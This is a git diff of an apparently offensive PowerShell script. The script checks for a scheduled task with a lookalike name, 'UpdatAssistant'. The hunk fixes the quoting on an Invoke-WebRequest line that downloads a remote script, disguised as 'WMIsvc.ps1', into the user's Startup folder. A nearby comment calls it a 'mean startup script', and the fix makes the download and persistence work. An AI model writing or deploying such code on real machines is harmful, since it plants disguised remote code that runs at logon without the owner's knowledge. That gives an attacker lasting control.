@@ -36,5 +36,5 @@ if (-not (Get-ScheduledTask -TaskName UpdatAssistant -ErrorAction SilentlyContin
 
 # Download mean startup script
 if (-not (Test-Path "$env:appdata\Microsoft\Windows\Start Menu\Programs\StartUp\WMIsvc.ps1")){
-    Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/lfgberg/erm/master/WMIsvc.ps1' -OutFile '$env:appdata\Microsoft\Windows\Start Menu\Programs\StartUp\WMIsvc.ps1'
+    Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/lfgberg/erm/master/WMIsvc.ps1' -OutFile "$env:appdata\Microsoft\Windows\Start Menu\Programs\StartUp\WMIsvc.ps1"
 }
